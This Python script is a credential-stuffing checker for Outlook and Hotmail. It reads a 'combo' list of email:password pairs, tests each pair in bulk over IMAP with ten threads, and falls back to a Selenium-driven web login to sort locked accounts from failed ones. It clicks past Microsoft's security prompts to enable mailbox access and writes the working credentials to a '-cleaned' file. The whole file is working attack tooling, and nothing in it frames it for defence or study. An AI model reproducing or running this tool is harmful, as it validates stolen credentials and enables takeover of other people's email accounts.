import imaplib
from colorama import Fore, init
import sys
from concurrent.futures import ThreadPoolExecutor
from threading import current_thread
import os
from os import system
import warnings
from time import sleep, time
from datetime import timedelta
from threading import Thread
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

system(f"title {os.path.basename(__file__)[:-3]}")
warnings.filterwarnings("ignore")
init(convert=True)

CERROR = Fore.RED
CWARNING = Fore.YELLOW
CSUCCESS = Fore.LIGHTGREEN_EX
CNEUTRAL = Fore.WHITE
CTHREAD = Fore.CYAN

max_workers = 10
max_tries = 3
cleaned = []
completed = 0
working = 0
failed_login = 0
failed_locked = 0
failed_select = 0

def stats():
    while queue == True:
        system(f"title {os.path.basename(__file__)[:-3]} - Tasks: {completed}/{len(cleaned_combo)} ^| Working: {working} ^| Locked: {failed_locked} ^| Login: {failed_login} ^| Select: {failed_select} ^| Time: {str(timedelta(seconds=(time() - start_time))).split('.')[0]}")
        sleep(0.01)

def check_imap(line):
    global cleaned
    global completed
    global working
    global failed_login
    global failed_locked
    global failed_select
    thread_number = int(current_thread().name.split('_')[1])+1
    if thread_number < 10:
        thread_number = "0" + str(thread_number)
    email_address = line.split(":")[0]
    password = line.split(":")[1]

    logged_in = False
    for i in range(max_tries):
        imap = imaplib.IMAP4_SSL("outlook.office365.com")
        try:
            imap.login(email_address, password)
        except:
            print(f"{CTHREAD}[Thread {thread_number}] {CWARNING}[WARNING] Couldn't login at try [{i+1}]: [{email_address}], retrying...")
            sleep(1)
        else:
            logged_in = True
            break
    if logged_in == False:
        try:
            options = webdriver.ChromeOptions()
            options.add_argument("--lang=en")
            options.add_argument("--mute-audio")
            options.add_experimental_option('excludeSwitches', ['enable-logging'])

            driver = webdriver.Chrome("./data/chromedriver.exe", options=options)
            driver.get("https://outlook.live.com/owa/?nlp=1")
            WebDriverWait(driver, 30).until(EC.element_to_be_clickable((By.ID, "i0116"))).send_keys(email_address)
            WebDriverWait(driver, 30).until(EC.element_to_be_clickable((By.ID, "idSIButton9"))).click()
            WebDriverWait(driver, 30).until(EC.element_to_be_clickable((By.ID, "i0118"))).send_keys(password)
            WebDriverWait(driver, 30).until(EC.element_to_be_clickable((By.ID, "idSIButton9"))).click()

            start_time = time()
            locked = False
            while True:
                if "Your account has been locked" in driver.page_source:
                    locked = True
                    break
                elif (time() - start_time) >= 15:
                    break
            driver.quit()
            if locked == True:
                print(f"{CTHREAD}[Thread {thread_number}] {CERROR}[ERROR] Account locked: [{email_address}], moving on...")
                with open(f"{combo_name}-failed_locked.txt", "a+") as file:
                    file.write(f"{line}\n")
                failed_locked += 1
                completed += 1
            else:
                print(f"{CTHREAD}[Thread {thread_number}] {CERROR}[ERROR] Couldn't login: [{email_address}], moving on...")
                with open(f"{combo_name}-failed_login.txt", "a+") as file:
                    file.write(f"{line}\n")
                failed_login += 1
                completed += 1
        except:
            print(f"{CTHREAD}[Thread {thread_number}] {CERROR}[ERROR] Couldn't login: [{email_address}], moving on...")
            with open(f"{combo_name}-failed_login.txt", "a+") as file:
                file.write(f"{line}\n")
            failed_login += 1
            completed += 1
    else:
        try:
            imap.select("Inbox")
        except:
            print(f"{CTHREAD}[Thread {thread_number}] {CWARNING}[WARNING] Couldn't select: [{email_address}], trying to fix...")
            fixed = False
            try:
                options = webdriver.ChromeOptions()
                options.add_argument("--lang=en")
                options.add_argument("--mute-audio")
                options.add_experimental_option('excludeSwitches', ['enable-logging'])

                driver = webdriver.Chrome("./data/chromedriver.exe", options=options)
                driver.get("https://outlook.live.com/owa/?nlp=1")
                WebDriverWait(driver, 30).until(EC.element_to_be_clickable((By.ID, "i0116"))).send_keys(email_address)
                WebDriverWait(driver, 30).until(EC.element_to_be_clickable((By.ID, "idSIButton9"))).click()
                WebDriverWait(driver, 30).until(EC.element_to_be_clickable((By.ID, "i0118"))).send_keys(password)
                WebDriverWait(driver, 30).until(EC.element_to_be_clickable((By.ID, "idSIButton9"))).click()

                click_start_time = time()
                while True:
                    if "Mail" in driver.title:
                        fixed = True
                        sleep(5)
                        break
                    elif (time() - click_start_time) >= 30:
                        break
                    try:
                        driver.find_element(By. ID, "idBtn_Back").click()
                    except:
                        pass
                    try:
                        driver.find_element(By. ID, "iShowSkip").click()
                    except:
                        pass
                    try:
                        driver.find_element(By. ID, "iCancel").click()
                    except:
                        pass
                driver.quit()
            except:
                print(f"{CTHREAD}[Thread {thread_number}] {CERROR}[ERROR] Couldn't select: [{email_address}], moving on...")
                with open(f"{combo_name}-failed_select.txt", "a+") as file:
                    file.write(f"{line}\n")
                failed_select += 1
                completed += 1
            else:
                if fixed == True:
                    now_working = False
                    for i in range(20):
                        try:
                            imap = imaplib.IMAP4_SSL("outlook.office365.com")
                            imap.login(email_address, password)
                            imap.select("Inbox")
                        except:
                            print(f"{CTHREAD}[Thread {thread_number}] {CWARNING}[WARNING] Couldn't select after fix at try [{i+1}]: [{email_address}], retrying...")
                            sleep(2)
                        else:
                            now_working = True
                            break
                    if now_working == True:
                        print(f"{CTHREAD}[Thread {thread_number}] {CSUCCESS}[SUCCESS] Fully working: [{email_address}]")
                        cleaned.append(line)
                        working += 1
                        completed += 1
                    else:
                        print(f"{CTHREAD}[Thread {thread_number}] {CERROR}[ERROR] Couldn't select after fix: [{email_address}], moving on...")
                        with open(f"{combo_name}-failed_select.txt", "a+") as file:
                            file.write(f"{line}\n")
                        failed_select += 1
                        completed += 1
                else:
                    print(f"{CTHREAD}[Thread {thread_number}] {CERROR}[ERROR] Couldn't fix: [{email_address}], moving on...")
                    with open(f"{combo_name}-failed_select.txt", "a+") as file:
                        file.write(f"{line}\n")
                    failed_select += 1
                    completed += 1
        else:
            print(f"{CTHREAD}[Thread {thread_number}] {CSUCCESS}[SUCCESS] Fully working: [{email_address}]")
            cleaned.append(line)
            working += 1
            completed += 1
        
combo_name = input("Enter name of created combo: ")
try:
    with open(f"{combo_name}.txt", "r") as f:
        combo = f.read().splitlines()
    cleaned_combo = []
    for i, line in enumerate(combo):
        try:
            email_address = line.split(":")[0]
            password = line.split(":")[1]
            if "@outlook.com" in email_address or "@hotmail.com" in email_address:
                cleaned_combo.append(line)
            else:
                print(f"{CWARNING}[WARNING] Line {i+1} is incorrect: [{''.join(line)}]")
        except:
            print(f"{CWARNING}[WARNING] Line {i+1} is incorrect: [{''.join(line)}]")
    print(f"{CSUCCESS}[SUCCESS] Successfully read combo, correct lines: [{len(cleaned_combo)}/{len(combo)}]")
except:
    input(f"{CERROR}[ERROR] Couldn't read combo, press ENTER to close...")
    sys.exit()

queue = True
start_time = time()
Thread(target=stats).start()
Pool = ThreadPoolExecutor(max_workers=max_workers)
for i, line in enumerate(cleaned_combo):
    Pool.submit(check_imap, line)
    if i < max_workers:
        sleep(0.1)
Pool.shutdown(wait=True)
if not cleaned == []:
    with open(f"{combo_name}-cleaned.txt", "a+") as file:
        for line in cleaned:
            file.write(f"{line}\n")
sleep(0.1)
queue = False
input(f"{CSUCCESS}Successfully completed all tasks, press ENTER to close...")